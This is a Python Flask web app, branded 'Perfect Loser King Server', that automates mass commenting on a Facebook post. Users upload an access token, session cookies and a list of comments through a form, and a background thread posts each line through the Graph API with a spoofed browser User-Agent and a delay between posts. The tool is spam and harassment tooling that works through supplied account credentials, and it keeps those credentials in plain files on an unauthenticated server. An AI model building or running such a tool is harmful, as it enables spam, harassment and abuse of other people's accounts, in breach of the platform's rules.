from flask import Flask, request, render_template_string
import os
import threading
import time
import requests

app = Flask(__name__)

DATA_DIR = "data"
os.makedirs(DATA_DIR, exist_ok=True)

TOKEN_FILE = os.path.join(DATA_DIR, "token.txt")
COOKIES_FILE = os.path.join(DATA_DIR, "cookies.txt")
COMMENT_FILE = os.path.join(DATA_DIR, "comments.txt")
TIME_FILE = os.path.join(DATA_DIR, "time.txt")
POST_FILE = os.path.join(DATA_DIR, "post_url.txt")

def save_data(token, cookies, comments, post_url, delay):
    with open(TOKEN_FILE, "w") as f:
        f.write(token.strip())

    with open(COOKIES_FILE, "w") as f:
        f.write(cookies.strip())

    with open(COMMENT_FILE, "w") as f:
        f.write(comments.strip())

    with open(POST_FILE, "w") as f:
        f.write(post_url.strip())

    with open(TIME_FILE, "w") as f:
        f.write(str(delay))

def extract_post_id(post_url):
    parts = post_url.split("/")
    post_id = None
    for part in parts:
        if part.isdigit():
            post_id = part
            break
    return post_id

def send_comments():
    try:
        with open(TOKEN_FILE, "r") as f:
            token = f.read().strip()
        with open(COOKIES_FILE, "r") as f:
            cookies = f.read().strip()
        with open(COMMENT_FILE, "r") as f:
            comments = f.readlines()
        with open(POST_FILE, "r") as f:
            post_url = f.read().strip()
        with open(TIME_FILE, "r") as f:
            delay = int(f.read().strip())

        post_id = extract_post_id(post_url)
        if not post_id:
            print(f"[!] Invalid Post URL: {post_url}")
            return

        cookies_dict = {}
        for line in cookies.split(";"):
            parts = line.strip().split("=")
            if len(parts) == 2:
                cookies_dict[parts[0]] = parts[1]

        for comment in comments:
            url = f"https://graph.facebook.com/v15.0/{post_id}/comments"
            headers = {'User-Agent': 'Mozilla/5.0'}
            payload = {'access_token': token, 'message': comment.strip()}

            response = requests.post(url, data=payload, headers=headers, cookies=cookies_dict)
            if response.ok:
                print(f"[+] Comment Sent: {comment.strip()}")
            else:
                print(f"[x] Failed: {response.status_code} {response.text}")

            time.sleep(delay)

    except Exception as e:
        print(f"[!] Error: {e}")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Perfect Loser King Server</title>
    <style>
        body { background-color: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; margin: 0; padding: 0; }
        .container { background: #111; max-width: 400px; margin: 50px auto; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(255, 255, 255, 0.2); }
        h1 { color: #00ffcc; }
        form { display: flex; flex-direction: column; }
        label { text-align: left; font-weight: bold; margin: 10px 0 5px; }
        input, textarea { padding: 10px; border: 1px solid #444; border-radius: 5px; background: #222; color: white; margin-bottom: 10px; width: 100%; }
        button { background-color: #00ffcc; color: black; padding: 10px; border: none; border-radius: 5px; cursor: pointer; }
        button:hover { background-color: #00cc99; }
        footer { margin-top: 20px; color: #777; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Perfect Loser King Server</h1>
        <form action="/" method="post" enctype="multipart/form-data">
            <label>Enter Facebook Post URL:</label>
            <input type="text" name="post_url" required>

            <label>Upload Access Token (token.txt):</label>
            <input type="file" name="token_file" required>

            <label>Upload Cookies File (cookies.txt):</label>
            <input type="file" name="cookies_file" required>

            <label>Upload Comment Text File (comments.txt):</label>
            <input type="file" name="comment_file" required>

            <label>Delay in Seconds:</label>
            <input type="number" name="delay" value="5" min="1">

            <button type="submit">Submit Details</button>
        </form>
        <footer>© 2025 Created by Perfect Loser King. All Rights Reserved.</footer>
    </div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        post_url = request.form.get("post_url")
        token_file = request.files.get("token_file")
        cookies_file = request.files.get("cookies_file")
        comment_file = request.files.get("comment_file")
        delay = int(request.form.get("delay", 5))

        if token_file and cookies_file and comment_file:
            token_path = os.path.join(DATA_DIR, "token.txt")
            cookies_path = os.path.join(DATA_DIR, "cookies.txt")
            comment_path = os.path.join(DATA_DIR, "comments.txt")

            token_file.save(token_path)
            cookies_file.save(cookies_path)
            comment_file.save(comment_path)

            with open(POST_FILE, "w") as f:
                f.write(post_url.strip())

            threading.Thread(target=send_comments, daemon=True).start()

    return render_template_string(HTML_TEMPLATE)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 3000))
    app.run(host='0.0.0.0', port=port)
